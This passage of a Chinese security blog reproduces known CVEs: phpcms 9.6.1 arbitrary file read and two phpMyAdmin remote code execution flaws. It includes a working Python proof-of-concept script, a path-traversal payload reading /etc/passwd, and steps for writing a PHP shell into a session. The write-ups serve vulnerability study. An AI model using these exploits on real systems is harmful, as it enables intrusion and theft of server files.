class="keyword">if</span>(ob_get_length() !== <span class="literal">false</span>) @ob_end_clean();</span><br><span class="line">	header(<span class="string">&#x27;Pragma: public&#x27;</span>);</span><br><span class="line">	header(<span class="string">&#x27;Last-Modified: &#x27;</span>.gmdate(<span class="string">&#x27;D, d M Y H:i:s&#x27;</span>) . <span class="string">&#x27; GMT&#x27;</span>);</span><br><span class="line">	header(<span class="string">&#x27;Cache-Control: no-store, no-cache, must-revalidate&#x27;</span>);</span><br><span class="line">	header(<span class="string">&#x27;Cache-Control: pre-check=0, post-check=0, max-age=0&#x27;</span>);</span><br><span class="line">	header(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">	header(<span class="string">&#x27;Content-Encoding: none&#x27;</span>);</span><br><span class="line">	header(<span class="string">&#x27;Content-type: &#x27;</span>.<span class="variable">$filetype</span>);</span><br><span class="line">	header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">	header(<span class="string">&#x27;Content-length: &#x27;</span>.<span class="variable">$filesize</span>);</span><br><span class="line">	readfile(<span class="variable">$filepath</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到他会直接读取文件然后,exit</p>
<p>我们再看下<code>download</code>中的<code>$fileurl</code>的生成过程:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#x27;</span>,<span class="variable">$f</span>) || strpos(<span class="variable">$f</span>, <span class="string">&quot;:\\&quot;</span>)!==<span class="literal">FALSE</span> || strpos(<span class="variable">$f</span>,<span class="string">&#x27;..&#x27;</span>)!==<span class="literal">FALSE</span>) showmessage(L(<span class="string">&#x27;url_error&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$m</span>) <span class="variable">$fileurl</span> = trim(<span class="variable">$s</span>).trim(<span class="variable">$fileurl</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#x27;</span>,<span class="variable">$fileurl</span>) ) showmessage(L(<span class="string">&#x27;url_error&#x27;</span>));</span><br><span class="line"><span class="variable">$fileurl</span> = str_replace(<span class="keyword">array</span>(pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_url&#x27;</span>),<span class="string">&#x27;/&#x27;</span>), <span class="keyword">array</span>(pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_path&#x27;</span>),DIRECTORY_SEPARATOR), <span class="variable">$fileurl</span>);</span><br><span class="line"><span class="variable">$fileurl</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$fileurl</span>);</span><br></pre></td></tr></table></figure>

<p><code>$fileurl</code>由<code>$f</code>产生的,其中不能带有php等关键字,但是我们可以利用最后一行的str_replace来绕过,而<code>$f</code>由<code>parse_str($a_k)</code>得来的</p>
<p>那么接下来我们要找一处</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pc_auth_key</span> = md5(pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;auth_key&#x27;</span>).<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="string">&#x27;down&#x27;</span>);</span><br><span class="line"><span class="variable">$a_k</span> = sys_auth(<span class="variable">$a_k</span>, <span class="string">&#x27;DECODE&#x27;</span>, <span class="variable">$pc_auth_key</span>);</span><br></pre></td></tr></table></figure>

<p>以<code>$pc_auth_key</code>作为密钥的加密点</p>
<p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p>
<p>显然只有中间的那个可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pc_auth_key</span> = md5(pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;auth_key&#x27;</span>).<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="string">&#x27;down&#x27;</span>);</span><br><span class="line"><span class="variable">$a_k</span> = urlencode(sys_auth(<span class="string">&quot;i=<span class="subst">$i</span>&amp;d=<span class="subst">$d</span>&amp;s=<span class="subst">$s</span>&amp;t=&quot;</span>.SYS_TIME.<span class="string">&quot;&amp;ip=&quot;</span>.ip().<span class="string">&quot;&amp;m=&quot;</span>.<span class="variable">$m</span>.<span class="string">&quot;&amp;f=<span class="subst">$f</span>&amp;modelid=&quot;</span>.<span class="variable">$modelid</span>, <span class="string">&#x27;ENCODE&#x27;</span>, <span class="variable">$pc_auth_key</span>));</span><br><span class="line"><span class="variable">$downurl</span> = <span class="string">&#x27;?m=content&amp;c=down&amp;a=download&amp;a_k=&#x27;</span>.<span class="variable">$a_k</span>;</span><br></pre></td></tr></table></figure>

<p>而<code>$i,$m,$f</code>等都是从<code>parse_str($a_k);</code>获得</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parse_str(<span class="variable">$a_k</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$i</span>)) <span class="variable">$i</span> = <span class="variable">$id</span> = intval(<span class="variable">$i</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$m</span>)) showmessage(L(<span class="string">&#x27;illegal_parameters&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$modelid</span>)||!<span class="keyword">isset</span>(<span class="variable">$catid</span>)) showmessage(L(<span class="string">&#x27;illegal_parameters&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$f</span>)) showmessage(L(<span class="string">&#x27;url_invalid&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>接下来就跟9.6.0版本的sql注入相同了</p>
<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url,proxies=&#123;&#125;</span>):</span></span><br><span class="line">    sess=requests.session()</span><br><span class="line">    sess.get(<span class="string">&quot;%s/index.php?m=wap&amp;siteid=1&quot;</span>%url)</span><br><span class="line">    sess.proxies=proxies</span><br><span class="line">    pre=<span class="built_in">list</span>(sess.cookies.get_dict())[<span class="number">0</span>][:<span class="number">5</span>]+<span class="string">&quot;_&quot;</span></span><br><span class="line">    userid=sess.cookies.get_dict()[pre+<span class="string">&quot;siteid&quot;</span>]</span><br><span class="line">    param=&#123;</span><br><span class="line">        <span class="string">&quot;m&quot;</span>:<span class="string">&quot;attachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;c&quot;</span>:<span class="string">&quot;attachments&quot;</span>,</span><br><span class="line">        <span class="string">&quot;a&quot;</span>:<span class="string">&quot;swfupload_json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;src&quot;</span>:<span class="string">&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot;</span> % quote(<span class="string">&quot;index.p&lt;h&lt;p&amp;d=1&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(<span class="string">&quot;%s/index.php&quot;</span>%url,params=param,data=&#123;<span class="string">&quot;userid_flash&quot;</span>:userid&#125;)</span><br><span class="line">    <span class="comment">#print(sess.cookies.get_dict())</span></span><br><span class="line">    a_k=sess.cookies.get_dict()[pre+<span class="string">&quot;att_json&quot;</span>]</span><br><span class="line">    result=sess.get(<span class="string">&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;</span>%(url,a_k)).text</span><br><span class="line">    <span class="comment">#print(userid,a_k)</span></span><br><span class="line">    a_k=re.search(<span class="string">&#x27;&#x27;&#x27;a_k=([^&quot;]*)&#x27;&#x27;&#x27;</span>,result).groups()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#print(result)</span></span><br><span class="line">    <span class="comment">#print(a_k)</span></span><br><span class="line">    res=sess.get(<span class="string">&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;</span>%(url,a_k))</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;pc_base::creat_app();&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#,&#123;&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(poc(<span class="string">&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;</span>))</span><br></pre></td></tr></table></figure>







<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cku89gxv5005hwvos592k2wi0" data-title="phpcmsv9.6.1任意文件读取" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-phpmyadmin 4.8.1 rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/phpmyadmin%204.8.1%20rce/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.631Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/phpmyadmin%204.8.1%20rce/">phpmyadmin 4.8.1 rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p>
<p>登陆账号</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境:phpstudy 2018,windows 10</p>
<p>漏洞位置:<code>index.php</code>:57</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>非常明显的任意文件包含漏洞</p>
<p>前面几个条件都很好满足,我们看下最后一个<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p>
<p>跟进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>要返回<code>true</code>的话,需要<code>$page</code>从开头到第一个<code>?</code>之间的字符串在白名单中,有以下白名单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">....</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>因为复现环境是在windows下,windows文件名不能包含<code>?</code>,所以<code>db_datadict.php?</code>会变为<code>db_datadict.php</code>是一个已经存在的文件,我们便无法用<code>../</code>来穿梭目录了,但是我们可以看到<code> $_page = urldecode($page);</code></p>
<p>所以我们可以构造<code>db_datadict.php%253f</code>来绕过</p>
<p>通用的payload:</p>
<p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
<p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p>
<p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/phpmyadmin%204.8.1%20rce/" data-id="cku89gxv6005lwvoscdvgc6mp" data-title="phpmyadmin 4.8.1 rce" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-phpmyadmin_登陆后_rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.631Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/">phpmyadmin_登陆后_rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadmin登陆后rce"><a href="#phpmyadmin登陆后rce" class="headerlink" title="phpmyadmin登陆后rce"></a>phpmyadmin登陆后rce</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote>
<p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p>
<p>以下版本受到影响：</p>
<ul>
<li>4.0.10.16之前4.0.x版本</li>
<li>4.4.15.7之前4.4.x版本</li>
<li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li>
</ul>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>全局搜索preg_replace,发现以下可能有可控变量的位置:</p>
<p>容易找到</p>
<p><code>TableSearch.lib.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_getRegexReplaceRows</span>(<span class="params"><span class="variable">$columnIndex</span>, <span class="variable">$find</span>, <span class="variable">$replaceWith</span>, <span class="variable">$charSet</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$column</span> = <span class="keyword">$this</span>-&gt;_columnNames[<span class="variable">$columnIndex</span>];</span><br><span class="line">        <span class="variable">$sql_query</span> = <span class="string">&quot;SELECT &quot;</span></span><br><span class="line">            . PMA_Util::backquote(<span class="variable">$column</span>) . <span class="string">&quot;,&quot;</span></span><br><span class="line">            . <span class="string">&quot; 1,&quot;</span> <span class="comment">// to add an extra column that will have replaced value</span></span><br><span class="line">            . <span class="string">&quot; COUNT(*)&quot;</span></span><br><span class="line">            . <span class="string">&quot; FROM &quot;</span> . PMA_Util::backquote(<span class="keyword">$this</span>-&gt;_db)</span><br><span class="line">            . <span class="string">&quot;.&quot;</span> . PMA_Util::backquote(<span class="keyword">$this</span>-&gt;_table)</span><br><span class="line">            . <span class="string">&quot; WHERE &quot;</span> . PMA_Util::backquote(<span class="variable">$column</span>)</span><br><span class="line">            . <span class="string">&quot; RLIKE &#x27;&quot;</span> . PMA_Util::sqlAddSlashes(<span class="variable">$find</span>) . <span class="string">&quot;&#x27; COLLATE &quot;</span></span><br><span class="line">            . <span class="variable">$charSet</span> . <span class="string">&quot;_bin&quot;</span>; <span class="comment">// here we</span></span><br><span class="line">            <span class="comment">// change the collation of the 2nd operand to a case sensitive</span></span><br><span class="line">            <span class="comment">// binary collation to make sure that the comparison is case sensitive</span></span><br><span class="line">        <span class="variable">$sql_query</span> .= <span class="string">&quot; GROUP BY &quot;</span> . PMA_Util::backquote(<span class="variable">$column</span>)</span><br><span class="line">            . <span class="string">&quot; ORDER BY &quot;</span> . PMA_Util::backquote(<span class="variable">$column</span>) . <span class="string">&quot; ASC&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;dbi&#x27;</span>]-&gt;fetchResult(<span class="variable">$sql_query</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$result</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$index</span>=&gt;<span class="variable">$row</span>) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$index</span>][<span class="number">1</span>] = preg_replace(</span><br><span class="line">                    <span class="string">&quot;/&quot;</span> . <span class="variable">$find</span> . <span class="string">&quot;/&quot;</span>,</span><br><span class="line">                    <span class="variable">$replaceWith</span>,</span><br><span class="line">                    <span class="variable">$row</span>[<span class="number">0</span>]</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>如果我们可以控制<code>$result和$replaceWith</code>那么我们就可以执行任意命令</p>
<p><img src="https://i.loli.net/2020/04/03/qo5ZbfuJHKA9d6m.png" alt="image1674"></p>
<p>我们先看<code>getReplacePreview</code></p>
<p><img src="https://i.loli.net/2020/04/03/vnk9IZUxJ5YoMbW.png" alt="image1764"></p>
<p>再查看调用<code>getReplacePreview</code>的函数</p>
<p><img src="https://i.loli.net/2020/04/03/JxKS1TioFz4w7ql.png" alt="image1858"></p>
<p>去看第二个和第三个明显不行,这里就不贴出来了</p>
<p>再跟进<code>tbl_find_replace.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;find&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$preview</span> = <span class="variable">$table_search</span>-&gt;getReplacePreview(</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;columnIndex&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;find&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;replaceWith&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;useRegex&#x27;</span>],</span><br><span class="line">        <span class="variable">$connectionCharSet</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$response</span>-&gt;addJSON(<span class="string">&#x27;preview&#x27;</span>, <span class="variable">$preview</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显白给</p>
<p>我们再回到<code>_getRegexReplaceRows</code>去查看它的第二个调用函数</p>
<p><img src="https://i.loli.net/2020/04/03/OhCPcviVT8tm6ZK.png" alt="image2318"></p>
<p>再查看调用replace的函数</p>
<p><img src="https://i.loli.net/2020/04/03/zT21ymqOYvUf5WE.png" alt="image2400"></p>
<p>同样后面两个还是不行</p>
<p>在跟进<code>tbl_find_replace.php</code></p>
<p><img src="https://i.loli.net/2020/04/03/j4JdNfKa8up2BCc.png" alt="image2504"></p>
<p>还是白给,两个调用链都是可以rce的,我们以前面那个为例</p>
<p>先往表中添加一条数据<code>INSERT INTO </code>flags<code> (</code>username<code>,</code>flag<code>,</code>msgid<code>) VALUES (UNHEX(&#39;302F6500&#39;),1,1);</code></p>
<p>直接抓包,修改</p>
<p><img src="https://i.loli.net/2020/04/03/FwSzMuNI4nDadBh.png" alt="image2701"></p>
<p><img src="https://i.loli.net/2020/04/03/QZE5fMTnUhPXdqV.png" alt="image2768"></p>
<p>成功</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>这个poc直接抄个别人的,懒得写了</p>
<p><code>https://www.exploit-db.com/exploits/40185</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" data-id="cku89gxv7005owvoseopvafng" data-title="phpmyadmin_登陆后_rce" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-pickle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/pickle/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.631Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/pickle/">python  pickle 入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
